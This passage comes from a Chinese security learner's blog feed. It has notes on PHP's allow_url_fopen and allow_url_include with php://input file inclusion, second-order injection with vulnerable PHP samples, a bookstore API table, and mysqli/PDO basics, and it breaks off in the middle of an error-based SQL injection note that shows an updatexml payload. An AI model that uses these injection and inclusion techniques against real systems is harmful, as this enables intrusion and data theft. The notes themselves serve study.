<p>Whether to allow the treatment of URLs (like http:// or ftp://) as files</p>
</blockquote>
<h3 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h3><blockquote>
<p>This setting requires allow_url_fopen to be on. </p>
</blockquote>
<p>官网意思是要开启<code>allow_url_include</code>你也得开启<code>allow_url_fopen</code><br>特地试了一下关闭<code>allow_url_fopen</code>打开<code>allow_url_include</code><br>好吧,官网没骗我<br>后来发现，好像不全是，继续看</p>
<p>具体作用是</p>
<blockquote>
<p>Whether to allow include/require to open URLs (like http:// or ftp://) as files</p>
</blockquote>
<p>就是说开了这个可以让include, include_once, require 和 require_once也都能用url和伪协议</p>
<blockquote>
<p> 原来官网描述这么清楚了</p>
</blockquote>
<h2 id="其他情况"><a href="#其他情况" class="headerlink" title="其他情况"></a>其他情况</h2><p>但是呢<br>在官网上查<code>data://</code>的时候，会告诉你</p>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Supported</th>
</tr>
</thead>
<tbody>
<tr>
<td>Restricted by allow_url_fopen</td>
<td>No</td>
</tr>
<tr>
<td>Restricted by allow_url_include</td>
<td>Yes</td>
</tr>
<tr>
<td>———————–</td>
<td>————–</td>
</tr>
</tbody>
</table>
<p>他这是告诉我用<code>data://</code>只要开<code>allow_url_include</code>不需要<code>allow_url_fopen</code>???<br>实践一下<br>但我尝试了官网的例子，提示我</p>
<pre class="line-numbers language-error"><code class="language-error">data:// wrapper is disabled in the server configuration by allow_url_fopen=0
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ヾ(｡｀Д´｡))，你骗我啊，还是要<code>allow_url_fopen</code>才能使用的呀好不好</p>
<h4 id="只用file-get-contents"><a href="#只用file-get-contents" class="headerlink" title="只用file_get_contents"></a>只用file_get_contents</h4><p>再试验一下<code>php://</code><br>先看<code>php://input</code></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'display_errors'</span><span class="token punctuation">,</span> <span class="token string">'On'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">'allow_url_fopen: '</span><span class="token punctuation">.</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'allow_url_fopen'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 0</span>
    <span class="token keyword">echo</span> <span class="token string">'allow_url_include: '</span><span class="token punctuation">.</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'allow_url_include'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 0</span>
    <span class="token comment" spellcheck="true">// method 1</span>
    <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input", "r");</span>
    <span class="token keyword">echo</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// method 2</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input");</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个<code>php://input</code>什么都不需要</p>
<p>再看下<code>php://filter</code></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'display_errors'</span><span class="token punctuation">,</span> <span class="token string">'On'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">'allow_url_fopen: '</span><span class="token punctuation">.</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'allow_url_fopen'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">'allow_url_include: '</span><span class="token punctuation">.</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'allow_url_include'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>

    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/resource=http://www.baidu.com");</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>要开<code>allow_url_fopen</code></p>
<h4 id="使用include"><a href="#使用include" class="headerlink" title="使用include"></a>使用include</h4><p>先都开一下</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'display_errors'</span><span class="token punctuation">,</span> <span class="token string">'On'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">'allow_url_fopen: '</span><span class="token punctuation">.</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'allow_url_fopen'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 1</span>
    <span class="token keyword">echo</span> <span class="token string">'allow_url_include: '</span><span class="token punctuation">.</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'allow_url_include'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 1</span>
    <span class="token keyword">include</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input");</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>POST是<code>http://www.eval.com/include/1.txt</code></p>
<p>下来都关掉</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'display_errors'</span><span class="token punctuation">,</span> <span class="token string">'On'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">'allow_url_fopen: '</span><span class="token punctuation">.</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'allow_url_fopen'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 0</span>
    <span class="token keyword">echo</span> <span class="token string">'allow_url_include: '</span><span class="token punctuation">.</span><span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string">'allow_url_include'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 0</span>
    <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input");</span>
    <span class="token keyword">echo</span> <span class="token variable">$input</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span> <span class="token variable">$input</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>POST是<code>http://www.eval.com/include/1.txt</code> 并不能<br>POST是<code>1.txt</code> 明显可以</p>
<h2 id="感觉自己中二病犯了"><a href="#感觉自己中二病犯了" class="headerlink" title="感觉自己中二病犯了"></a>感觉自己中二病犯了</h2><p>其实这些不都能想的到嘛<br>得出来一个结论好像是确实只要用到<code>allow_url_include</code>前提是你开了<code>allow_url_fopen</code></p>
<p>另外这个php伪协议并不等同于<code>url</code>,所以<code>php://input</code>没有也可以用,但你要<code>include</code>一个<code>php://input</code>的结果,这当然就要<code>allow_url_include</code>和<code>allow_url_fopen</code>了</p>
<p>但这个<code>data://</code>协议也需要<code>allow_url_fopen</code>的支持有些意外</p>
<p>其实就是<code>allow_url_include</code>是用来防护把远程的文件当做php代码执行的<br>而<code>allow_url_fopen</code>就是为了能让url当做文件来用</p>
<p>以前可能确实有一个误区就是url不能用的话,<code>php伪协议</code>也一定不能用，感觉他们好像是同类一样</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[二次注入]]></title>
      <url>/2017/07/17/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>续<code>sql注入从入门到入门</code><br>因为这个二次注入，听说过，也见师傅注过<br>但还是不太知道这个二次是个什么意思</p>
<h2 id="二次"><a href="#二次" class="headerlink" title="二次"></a>二次</h2><p>以前听到的都是关于引号的转义<br>大意是注册的时候,由于GPC或者其他，我们输入的payload里的单引号被转义了</p>
<pre class="line-numbers language-sql"><code class="language-sql">?username<span class="token operator">=</span>akak'
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">insert</span> <span class="token keyword">into</span> <span class="token keyword">user</span><span class="token punctuation">(</span>uname<span class="token punctuation">)</span> vaules <span class="token punctuation">(</span><span class="token string">'akak\''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span><span class="token punctuation">;</span>

<span class="token operator">+</span><span class="token comment" spellcheck="true">----+-----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> uname     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">----+-----------+</span>
<span class="token operator">|</span>   <span class="token number">1</span><span class="token operator">|</span>akak'      <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment" spellcheck="true">----+-----------+</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个单引号就进去了，再取出来的时候，就引入了单引号<br>是不是说这里如果开了<code>magic_qutoes_runtime</code>就可以防止二次注入了???</p>
<p>所以这个二次指的就是第一次不会直接造成危害<br>再第二次用的时候实现了注入</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>上面就是正文哈哈哈哈<br>这次<code>某春秋全国大学生交换flag大赛</code>里有这样的一个题目叫 <code>flag bending machine</code><br>是一道二次注入,不过和单引号bypass没有什么关系</p>
<h2 id="刚刚"><a href="#刚刚" class="headerlink" title="刚刚"></a>刚刚</h2><p>就在刚刚准备找更多的一些资料，发现了一个ppt叫做<a href="http://read.pudn.com/downloads137/ebook/584779/web%B4%FA%C2%EB%B0%B2%C8%AB%B1%DF%D4%B5%D0%D4%CE%CA%CC%E2.ppt" target="_blank" rel="external">web代码安全边缘性问题</a></p>
<p>网名为<code>5up3rh3i</code>的大佬,拼写了一下，发现好像其实是传说级大佬黑哥<br>这个ppt里详细的说了一下<code>二次注入</code></p>
<p>感觉是一份神级资料<br>原来这个二次是<code>Second attack</code>,ahhhhh~</p>
<p>require一个文件存在错误的话，那么程序就会中断执行了，并显示致命错误<br>include一个文件存在错误的话，那么程序不会中端，而是继续执行，并显示一个警告错误</p>
<p>以下内容来自上面的ppt，我只是摘抄出来</p>
<p>二次攻击的特点</p>
<ul>
<li>常常存在漏洞类型的转换</li>
<li>常常存在变量中转</li>
</ul>
<p>类型1 文件系统函数漏洞转换</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span> 
    <span class="token comment" spellcheck="true">// vul1.php</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>

<span class="token delimiter">&lt;?</span> 
    <span class="token comment" spellcheck="true">//config.php</span>
    <span class="token variable">$include</span> <span class="token operator">=</span> <span class="token string">'../'</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>

<span class="token delimiter">&lt;?</span> 
    <span class="token comment" spellcheck="true">//vul2.php</span>
    <span class="token keyword">include</span> <span class="token string">'$include/common.php'</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们用<code>vul1.php</code>把<code>config.php</code>删掉,这样子在<code>register_globals=On</code>的情况下就能用<code>vul2.php</code>包含任意文件了</p>
<p>类型2 SQL注入漏洞转换</p>
<pre><code>SQL注入 =&gt; Update/Insert =&gt; 数据库
数据库 =&gt; Select =&gt; 其它函数
</code></pre><p>这个漏洞在第二阶段取出来丢到其他函数的时候触发<br>举的例子就是先update了一波，但经过escape,防了一波SQL注入<br>但没有过滤<code>../</code>这些<br>后来又给select出来了丢到include里，这个时候利用了一波</p>
<p>类型3 preg_replace</p>
<pre class="line-numbers language-php"><code class="language-php">mixed <span class="token function">preg_replace</span> <span class="token punctuation">(</span> mixed <span class="token variable">$pattern</span> <span class="token punctuation">,</span> mixed <span class="token variable">$replacement</span> <span class="token punctuation">,</span> mixed <span class="token variable">$subject</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>$subject 是要替换的母串<br>$pattern 是模式<br>$replacement 是要替换成的</p>
<p>第一个参数加了修饰符号<code>/e</code>的时候,第二个参数会被当做命令来执行<br>有些没看懂<br>另外<code>preg_replace</code>里存在%00截断(是不是现在已经被修复了???)</p>
<p>类型4 编码/解码<br>就是讲了<code>二次编码</code>造成的洞</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[API]]></title>
      <url>/2017/07/16/API/</url>
      <content type="html"><![CDATA[<h2 id="baseURI"><a href="#baseURI" class="headerlink" title="baseURI"></a>baseURI</h2><p>api.booksotre.com/v1/</p>
<h2 id="遵循"><a href="#遵循" class="headerlink" title="遵循"></a>遵循</h2><p>基本遵循restful API</p>
<h2 id="主要路由"><a href="#主要路由" class="headerlink" title="主要路由"></a>主要路由</h2><table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/index</td>
<td>首页</td>
</tr>
<tr>
<td>GET</td>
<td>/login</td>
<td>登录页面</td>
</tr>
<tr>
<td>GET</td>
<td>/logout</td>
<td>退出登录</td>
</tr>
<tr>
<td>GTE</td>
<td>/admin</td>
<td>书商管理</td>
</tr>
</tbody>
</table>
<h2 id="具体功能"><a href="#具体功能" class="headerlink" title="具体功能"></a>具体功能</h2><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><blockquote>
<p>登陆后更新session内容</p>
</blockquote>
<table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/login</td>
<td>null</td>
<td>显示登录界面</td>
</tr>
<tr>
<td>POST</td>
<td>/login</td>
<td>uname&amp;passwd</td>
<td>登录操作</td>
</tr>
</tbody>
</table>
<h2 id="logout"><a href="#logout" class="headerlink" title="logout"></a>logout</h2><blockquote>
<p>注销后清掉session</p>
</blockquote>
<table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>ALL</td>
<td>/logout</td>
<td>null</td>
<td>退出登录</td>
</tr>
</tbody>
</table>
<h2 id="register"><a href="#register" class="headerlink" title="register"></a>register</h2><table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/regiter</td>
<td>null</td>
<td>显示注册界面</td>
</tr>
<tr>
<td>POST</td>
<td>/regiter</td>
<td>uname&amp;passwd</td>
<td>注册操作</td>
</tr>
</tbody>
</table>
<h2 id="search"><a href="#search" class="headerlink" title="search"></a>search</h2><blockquote>
<p>搜索功能，这里只涉及了书名搜索</p>
</blockquote>
<table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>/search</td>
<td>bname</td>
<td>搜索书籍</td>
</tr>
</tbody>
</table>
<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><blockquote>
<p>后台管理界面，具体后台管理内容还未完全设计出</p>
</blockquote>
<table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/admin</td>
<td>null</td>
<td>进入后台管理界面</td>
</tr>
</tbody>
</table>
<h2 id="订单相关"><a href="#订单相关" class="headerlink" title="订单相关"></a>订单相关</h2><blockquote>
<p>没有参数，是由session来决定用户</p>
</blockquote>
<table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/orders</td>
<td>null</td>
<td>查看所有订单</td>
</tr>
<tr>
<td>POST</td>
<td>/order</td>
<td>null</td>
<td>提交订单</td>
</tr>
<tr>
<td>DELETE</td>
<td>/order</td>
<td>null</td>
<td>删除订单</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/order/:id</td>
<td>id</td>
<td>查看订单详情</td>
</tr>
<tr>
<td>PUT</td>
<td>/order/:id</td>
<td>id</td>
<td>修改订单</td>
</tr>
</tbody>
</table>
<h2 id="书籍相关"><a href="#书籍相关" class="headerlink" title="书籍相关"></a>书籍相关</h2><table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/books/:typeId</td>
<td>typeId</td>
<td>查看某分类图书</td>
</tr>
<tr>
<td>POST</td>
<td>/bookType</td>
<td>null</td>
<td>返回书籍类型</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>method</th>
<th>path</th>
<th>param</th>
<th>description</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>/book/:bookId</td>
<td>typeId</td>
<td>查看某分类图书</td>
</tr>
</tbody>
</table>
]]></content>
      
        
        <tags>
            
            <tag> 临时 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php里mysql, mysqli和pdo]]></title>
      <url>/2017/07/16/php%E9%87%8Cmysql-mysqli%E5%92%8Cpdo/</url>
      <content type="html"><![CDATA[<h2 id="远古的mysql"><a href="#远古的mysql" class="headerlink" title="远古的mysql"></a>远古的mysql</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$db_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM news where id = '$id'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// error report</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个时候只能只过程化的写法,而且不能使用<code>bind column</code>,导致容易注入<br>然后出现了<code>mysql_escape_string()</code>和<code>mysql_real_escape_string()</code></p>
<h3 id="mysql-escape-string"><a href="#mysql-escape-string" class="headerlink" title="mysql_escape_string"></a>mysql_escape_string</h3><p>这里和另一个叫做<code>mysql_real_escape_string</code>是兄弟，唯一的区别real是根据当前字符集转义字符串</p>
<blockquote>
<p>从这个数据来源来说<br><code>magic_quotes_gpc</code>作用范围是<code>GET</code>,<code>POST</code>,<code>COOKIE</code><br><code>magic_quotes_runtime</code>作用范围是<code>数据库</code>或者文件中获得的数据<br><code>addslashes</code>,<code>mysql_[real_]escape_string</code>是对字符串作用</p>
<p>从作用范围来说<br><code>addslashes</code>和GPC和<code>magic_quotes_runtime</code>是对</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token punctuation">[</span>'<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>"<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>\<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">NULL</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</blockquote>
<p><code>mysql_[real_]escape_string</code>是针对</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token punctuation">[</span>'<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>"<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>\<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">NULL</span>
<span class="token punctuation">[</span>\n<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>\r<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>\x1a<span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="之后出现的mysqli"><a href="#之后出现的mysqli" class="headerlink" title="之后出现的mysqli"></a>之后出现的mysqli</h2><p>这个时候的<code>mysqli</code><br>既可以<a href="http://blog.csdn.net/koastal/article/details/50650496" target="_blank" rel="external">面向过程</a><br>又可以<a href="http://www.php.net/manual/zh/book.mysqli.php" target="_blank" rel="external">面向对象</a><br>所以既能看到这样子的</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$passwd</span><span class="token punctuation">,</span> <span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>又有这样子的</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$passwd</span><span class="token punctuation">,</span> <span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$mysqli</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>或者还有预编译的功能，先编译，然后绑定，执行(有面向对象和过程两种风格)</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$passwd</span><span class="token punctuation">,</span> <span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO test(id) VALUES (?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token variable">$stmt</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$stmt</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$stmt</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">get_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个参数绑定可以提高安全性的样子<br>这里的<code>bind_param($type, $arg1 [,$arg2...])</code>，<code>arg1</code>,<code>arg2</code>…对应的分别是第一个，第二个<code>?</code>,<code>$type</code>是参数类型</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO CountryLanguage VALUES (?, ?, ?, ?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string">'sssd'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">,</span> <span class="token variable">$language</span><span class="token punctuation">,</span> <span class="token variable">$official</span><span class="token punctuation">,</span> <span class="token variable">$percent</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="最后的pdo"><a href="#最后的pdo" class="headerlink" title="最后的pdo"></a>最后的pdo</h2><p>加了一个抽象层，把应用层和数据库之间加了一层pdo</p>
]]></content>
      
        
        <tags>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[xss从入门到入门1]]></title>
      <url>/2017/07/15/xss%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A81/</url>
      <content type="html"><![CDATA[<p>这里有一篇资料总结<br><a href="http://blog.csdn.net/caiqiiqi/article/details/73456264" target="_blank" rel="external">http://blog.csdn.net/caiqiiqi/article/details/73456264</a></p>
<p>dalao博客里有大量关于CSP的知识<br><a href="https://lorexxar.cn/" target="_blank" rel="external">https://lorexxar.cn/</a></p>
]]></content>
      
        
        <tags>
            
            <tag> xss </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sql注入从入门到入门]]></title>
      <url>/2017/07/15/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>一直不会SQL注入，感觉师傅注的好熟练<br>今天学习一下(这是挖了个坑)</p>
<h2 id="常见分类"><a href="#常见分类" class="headerlink" title="常见分类"></a>常见分类</h2><p>按照SQLMAP的分类</p>
<h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><h3 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h3><ul>
<li><p>updatexml()<br>是利用了<code>xpath syntax error</code></p>
<pre class="line-numbers language-sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> book <span class="token keyword">where</span> type_id <span class="token operator">=</span> <span class="token number">14</span> <span class="token operator">and</span> <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ERROR <span class="token number">1105</span> <span class="token punctuation">(</span>HY000<span class="token punctuation">)</span>: XPATH syntax error: <span class="token string">'~root@localhost~'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>其中这里的<code>~</code>就是<code>0x7e</code>,大概是为了显示更清楚吧</p>
</li>
<li><p>extractvalue()<br>报错原理同<code>updatexml</code>,所以用法也差不多</p>
